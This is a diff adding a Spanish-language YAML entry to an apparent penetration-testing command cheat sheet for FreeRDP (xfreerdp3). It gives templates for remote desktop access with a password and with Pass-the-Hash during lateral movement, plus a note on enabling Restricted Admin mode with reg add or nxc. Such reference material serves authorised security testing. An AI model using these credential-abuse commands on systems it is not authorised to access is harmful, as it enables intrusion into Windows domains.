@@ -1,0 +1,26 @@
+# Comandos de FreeRDP (xfreerdp3): escritorio remoto desde Linux.
+tool: xfreerdp
+area: ad
+url: https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface-(3.x)
+commands:
+  - id: xfreerdp-pass
+    title: Escritorio remoto con contraseña
+    cmd: |
+      xfreerdp3 /v:{{RHOST}} /u:{{USER}} /p:'{{PASS}}' /d:{{DOMAIN}} /cert:ignore /dynamic-resolution +clipboard /drive:share,.
+    phase: lateral
+    tags: [rdp]
+    notes: >-
+      /drive comparte tu carpeta actual con el Windows (aparece en el Explorador como share): así
+      subes y bajas archivos. En versiones antiguas de Kali el binario es xfreerdp.
+    refs: [https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface-(3.x)]
+
+  - id: xfreerdp-pth
+    title: Escritorio remoto con Pass-the-Hash
+    cmd: |
+      xfreerdp3 /v:{{RHOST}} /u:{{USER}} /pth:{{HASH}} /d:{{DOMAIN}} /cert:ignore
+    phase: lateral
+    tags: [rdp, pass-the-hash]
+    notes: >-
+      Solo funciona si el servidor tiene activo el modo Restricted Admin (DisableRestrictedAdmin = 0
+      en HKLM\System\CurrentControlSet\Control\Lsa). Con admin local se puede activar con nxc o reg add.
+    refs: [https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface-(3.x)]
